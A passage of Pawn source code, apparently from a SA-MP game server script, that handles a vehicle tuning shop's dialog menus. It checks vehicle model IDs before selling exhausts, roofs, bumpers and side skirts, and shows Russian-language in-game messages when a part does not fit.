					GetVehicleModel(GetPlayerVehicleID(playerid)) == 542 ||//clover
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400 ||//landstalker
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||//previon
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)//zr-350
					{
			        	TuningBuy(playerid,"Выхлоп",1021,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
        	    case 6: // Small
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436)//previon
					{
			            TuningBuy(playerid,"Выхлоп",1022,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
        	    case 7: // Twin
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 542 ||//clover
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400 ||//landstalker
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||//previon
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549 ||//tampa
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)//zr-350
					{
			        	TuningBuy(playerid,"Выхлоп",1019,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
        	    case 8: // Upswept
        	    {
             		if(
                    GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 542 ||//clover
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 400 ||//landstalker
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549 ||//tampa
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)//zr-350
					{
			        	TuningBuy(playerid,"Выхлоп",1018,3000);
					}
	  			 	else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 320:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
	             	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {

		            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Крыша",1038,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Крыша",1054,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Крыша",1067,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Крыша",1055,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Крыша",1032,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Крыша",1088,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
	             	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {


			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Крыша",1035,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565)TuningBuy(playerid,"Крыша",1053,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Крыша",1068,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Крыша",1061,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Крыша",1033,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Крыша",1091,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
	             	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567) TuningBuy(playerid,"Крыша",1130,4000);
   					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) TuningBuy(playerid,"Крыша",1128,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567) TuningBuy(playerid,"Крыша",1131,4000);
  					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) TuningBuy(playerid,"Крыша",1103,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
					}
        	    }
				case 4:
        	    {
                 	if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 492 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 580 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)
					{
			        	TuningBuy(playerid,"Крыша",1006,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 321:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
                 	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
					{
		            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Передний бампер",1171,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Передний бампер",1153,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Передний бампер",1160,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Передний бампер",1155,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)TuningBuy(playerid,"Передний бампер",1169,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Передний бампер",1166,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Передний бампер",1172,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Передний бампер",1152,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Передний бампер",1173,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Передний бампер",1157,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Передний бампер",1170,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Передний бампер",1165,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
                 	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
					{
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Передний бампер",1174,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Передний бампер",1179,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Передний бампер",1189,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)TuningBuy(playerid,"Передний бампер",1182,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Передний бампер",1115,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Передний бампер",1191,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
		            GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Передний бампер",1175,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Передний бампер",1185,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Передний бампер",1188,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) TuningBuy(playerid,"Передний бампер",1181,8000);

				    else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Передний бампер",1116,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Передний бампер",1190,8000);

					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 322:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
					{

		            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Задний бампер",1149,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Задний бампер",1150,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559)  TuningBuy(playerid,"Задний бампер",1159,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561)  TuningBuy(playerid,"Задний бампер",1154,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)  TuningBuy(playerid,"Задний бампер",1141,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Задний бампер",1168,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
                 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
				GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
				GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
				GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
				GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
				GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
		        {


			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Задний бампер",1148,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Задний бампер",1151,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Задний бампер",1161,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Задний бампер",1156,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Задний бампер",1140,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Задний бампер",1167,8000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
			        {


				        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Задний бампер",1176,8000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Задний бампер",1180,8000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Задний бампер",1187,8000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)TuningBuy(playerid,"Задний бампер",1184,8000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Задний бампер",1109,8000);
						else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Задний бампер",1192,8000);
	     			}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuy(playerid,"Задний бампер",1177,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)TuningBuy(playerid,"Задний бампер",1178,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)TuningBuy(playerid,"Задний бампер",1186,8000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)TuningBuy(playerid,"Задний бампер",1183,8000);

					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Задний бампер",1110,8000);

					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuy(playerid,"Задний бампер",1193,8000);

					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
						ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
					}
        	    }
        	    
			}
		}
		case 323:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {

		            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuyD(playerid,"Боковые юбки",1036,1040,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuyD(playerid,"Боковые юбки",1047,1051,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559)TuningBuyD(playerid,"Боковые юбки",1069,1071,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561)TuningBuyD(playerid,"Боковые юбки",1056,1062,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)TuningBuyD(playerid,"Боковые юбки",1026,1027,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558)TuningBuyD(playerid,"Боковые юбки",1090,1094,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {


			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuyD(playerid,"Боковые юбки",1039,1041,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565)TuningBuyD(playerid,"Боковые юбки",1048,1052,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuyD(playerid,"Боковые юбки",1070,1072,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuyD(playerid,"Боковые юбки",1057,1063,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuyD(playerid,"Боковые юбки",1031,1030,5000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558)  TuningBuyD(playerid,"Боковые юбки",1093,1095,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 576 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)
					{
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575) TuningBuyD(playerid,"Боковые юбки",1042,1099,5000);
	   				else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567) TuningBuyD(playerid,"Боковые юбки",1102,1133,5000);
	                else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) TuningBuyD(playerid,"Боковые юбки",1134,1137,5000);
	                else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) TuningBuyD(playerid,"Боковые юбки",1108,1107,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) TuningBuyD(playerid,"Боковые юбки",1122,1101,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
				case 4:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)
				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) TuningBuyD(playerid,"Боковые юбки",1106,1124,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
				case 5:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)

				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuyD(playerid,"Боковые юбки",1118,1120,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
				case 6:
        	    {
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)

			    	{
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuyD(playerid,"Боковые юбки",1119,1121,5000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
